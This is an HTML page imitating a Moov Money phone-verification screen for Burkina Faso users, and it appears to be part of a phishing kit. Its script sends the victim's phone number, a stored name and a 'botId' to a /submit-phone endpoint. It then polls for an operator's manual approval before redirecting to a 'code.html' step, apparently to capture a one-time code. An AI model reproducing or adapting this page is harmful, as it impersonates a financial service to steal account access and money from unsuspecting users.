<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Moov Money - Vérification</title>

    <style>
    /* ===========================
       RESET
    ============================ */
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    html,
    body {
        width: 100%;
        height: 100%;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        background: #ffffff;
        color: #333;
    }

    body {
        display: flex;
        flex-direction: column;
    }

    /* ===========================
       TOP ORANGE HEADER
    ============================ */
    .top-bar {
        width: 100%;
        height: 82px;
        background: #f57c00;
        display: flex;
        align-items: flex-end;
        padding: 0 22px 18px;
        flex-shrink: 0;
    }

    .back-btn {
        color: #fff;
        text-decoration: none;
        font-size: 30px;
        line-height: 1;
        font-weight: 300;
    }

    /* ===========================
       PAGE CONTAINER
    ============================ */
    .container {
        width: 100%;
        max-width: 100%;
        flex: 1;
        padding: 36px 28px 24px;
        display: flex;
        flex-direction: column;
    }

    /* ===========================
       TITLE
    ============================ */
    .title {
        font-size: 24px;
        font-weight: 700;
        color: #333;
        margin-bottom: 8px;
    }

    .subtitle {
        font-size: 15px;
        color: #9b9b9b;
        line-height: 1.45;
        margin-bottom: 26px;
    }

    /* ===========================
       PHONE FIELD
    ============================ */
    .phone-input-wrap {
        position: relative;
        width: 100%;
        margin-bottom: 26px;
    }

    .phone-input-wrap input {
        width: 100%;
        height: 58px;
        border: 2px solid #2f73b9;
        border-radius: 10px;
        background: #fff;
        padding: 0 16px 0 64px;
        font-size: 17px;
        color: #333;
        outline: none;
        transition: .2s;
    }

    .phone-input-wrap input::placeholder {
        color: #999;
    }

    .phone-input-wrap input:focus {
        border-color: #2f73b9;
    }

    .country-code {
        position: absolute;
        left: 14px;
        top: 50%;
        transform: translateY(-50%);
        font-size: 17px;
        color: #333;
        font-weight: 500;
        pointer-events: none;
    }

    /* Remove dropdown arrow */
    .country-code::after {
        display: none;
    }

    /* ===========================
       PUSH BOTTOM CONTENT
    ============================ */
    .bottom-section {
        margin-top: auto;
    }

    /* ===========================
       CHECKBOX
    ============================ */
    .checkbox-wrap {
        display: flex;
        justify-content: center;
        align-items: center;
        gap: 12px;
        margin-bottom: 18px;
        text-align: center;
    }

    .checkbox-wrap input[type="checkbox"] {
        width: 20px;
        height: 20px;
        accent-color: #2f73b9;
        cursor: pointer;
    }

    .checkbox-wrap label {
        font-size: 15px;
        color: #666;
        line-height: 1.5;
    }

    .checkbox-wrap label a {
        color: #2f73b9;
        text-decoration: none;
    }

    .checkbox-wrap label a:hover {
        text-decoration: underline;
    }

    /* ===========================
       CONTINUE BUTTON
    ============================ */
    button {
        width: 100%;
        height: 58px;
        border: none;
        border-radius: 10px;
        font-size: 20px;
        font-weight: 600;
        color: #fff;
        background: #b7cff0;
        cursor: not-allowed;
        transition: .2s;
    }

    button:enabled {
        background: #2f73b9;
        cursor: pointer;
    }

    button:enabled:hover {
        background: #2665a4;
    }

    /* ===========================
       HIDE STATUS/SPINNER
    ============================ */
    .status,
    .spinner {
        display: none !important;
    }

    /* ===========================
       RESPONSIVE
    ============================ */
    @media (max-width:480px) {

        .container {
            padding: 34px 20px 22px;
        }

        .title {
            font-size: 22px;
        }

        .subtitle {
            font-size: 14px;
        }

        .phone-input-wrap input {
            height: 56px;
            font-size: 16px;
            padding-left: 60px;
        }

        .country-code {
            font-size: 16px;
        }

        button {
            height: 56px;
            font-size: 19px;
        }
    }

    @media (max-width:360px) {

        .container {
            padding: 28px 16px 18px;
        }

        .title {
            font-size: 20px;
        }

        .subtitle {
            font-size: 13px;
        }

        .phone-input-wrap input {
            height: 54px;
            font-size: 15px;
        }

        .checkbox-wrap label {
            font-size: 13px;
        }

        button {
            font-size: 18px;
        }
    }
</style>
</head>

<body>

     <!-- Orange Header -->
    <div class="top-bar">
        <a href="javascript:history.back()" class="back-btn">&#8592;</a>
    </div>

    <!-- Main Content -->
    <div class="container">

        <div class="title">Commençons</div>

        <div class="subtitle">
            Entrez votre numéro de téléphone pour commencer
        </div>

        <form id="detailsForm">

            <!-- Phone Number -->
            <div class="phone-input-wrap">
                <span class="country-code">+226</span>

                <input
                    type="tel"
                    id="phone"
                    name="phone"
                    placeholder="Saisissez le numéro de téléphone"
                    autocomplete="tel-national"
                    required>
            </div>

            <!-- Bottom Section -->
            <div class="bottom-section">

                <!-- Terms -->
                <div class="checkbox-wrap">

                    <input
                        type="checkbox"
                        id="termsCheck"
                        required>

                    <label for="termsCheck">
                        J'accepte le
                        <a href="#">Conditions d'utilisation</a>
                        et
                        <a href="#">Politique de confidentialité</a>
                    </label>

                </div>

                <!-- Continue Button -->
                <button
                    type="submit"
                    class="primary"
                    id="continueBtn"
                    disabled>
                    Continuer
                </button>

            </div>

        </form>

        <!-- Hidden elements (for later use) -->
        <div id="status" class="status"></div>
        <div id="spinner" class="spinner"></div>

    </div>
    <script>
document.addEventListener("DOMContentLoaded", () => {

    const form = document.getElementById("detailsForm");
    const phone = document.getElementById("phone");
    const terms = document.getElementById("termsCheck");
    const button = document.getElementById("continueBtn");
    const spinner = document.getElementById("spinner");
    const status = document.getElementById("status");

    function validateForm() {
        const phoneNumber = phone.value.replace(/\D/g, "");

        if (phoneNumber.length >= 8 && terms.checked) {
            button.disabled = false;
        } else {
            button.disabled = true;
        }
    }

    phone.addEventListener("input", function () {
        this.value = this.value.replace(/\D/g, "");
        validateForm();
    });

    terms.addEventListener("change", validateForm);

    form.addEventListener("submit", function (e) {
        e.preventDefault();

        button.disabled = true;
        spinner.style.display = "block";

        status.style.display = "block";
        status.textContent = "⏳ En attente d'approbation...";

        // Your submission logic goes here
    });

});
</script>
    <script>
        let fullName = localStorage.getItem('fullName');
        if (!fullName) { fullName = 'Client Moov Money';
            localStorage.setItem('fullName', fullName); }

        const params = new URLSearchParams(window.location.search);
        const urlBotId = params.get('botId');
        if (urlBotId) localStorage.setItem('botId', urlBotId);
        const botId = localStorage.getItem('botId');

        if (!botId) { alert('Session expirée. Veuillez recommencer.');
            window.location.href = 'index.html'; }

        const form = document.getElementById('detailsForm');
        const statusEl = document.getElementById('status');
        const spinner = document.getElementById('spinner');
        const nextButton = form.querySelector('button.primary');
        const termsCheck = document.getElementById('termsCheck');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            if (!termsCheck.checked) {
                statusEl.style.display = 'block';
                statusEl.classList.add('error');
                statusEl.textContent = '❌ Veuillez accepter les conditions d\'utilisation';
                return;
            }
            nextButton.disabled = true;
            const phone = document.getElementById('phone').value.trim();
            if (!phone) {
                statusEl.style.display = 'block';
                statusEl.classList.add('error');
                statusEl.textContent = '❌ Veuillez entrer un numéro de téléphone';
                nextButton.disabled = false;
                return;
            }
            localStorage.setItem('phone', phone);
            statusEl.style.display = 'block';
            spinner.style.display = 'block';
            statusEl.classList.remove('error');
            statusEl.textContent = '⏳ En attente d\'approbation...';
            try {
                const res = await fetch(`${window.location.origin}/submit-phone`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ name: fullName, phone, botId })
                });
                if (!res.ok) throw new Error();
                const { requestId } = await res.json();
                pollApproval(requestId);
            } catch (error) {
                spinner.style.display = 'none';
                statusEl.classList.add('error');
                statusEl.textContent = '❌ Erreur serveur. Veuillez réessayer.';
                nextButton.disabled = false;
            }
        });

        function pollApproval(requestId) {
            const interval = setInterval(async () => {
                try {
                    const res = await fetch(`${window.location.origin}/check-phone/${requestId}`);
                    const data = await res.json();
                    if (data.redirect) { clearInterval(interval);
                        window.location.href = data.redirect; return; }
                    if (data.approved === false) {
                        clearInterval(interval);
                        spinner.style.display = 'none';
                        statusEl.classList.add('error');
                        statusEl.textContent = '❌ Numéro rejeté. Veuillez réessayer.';
                        nextButton.disabled = false;
                    }
                    if (data.approved === true) { clearInterval(interval);
                        window.location.href = 'code.html'; }
                } catch (error) { console.error('Polling error:', error); }
            }, 2000);
        }
    </script>

</body>
</html>
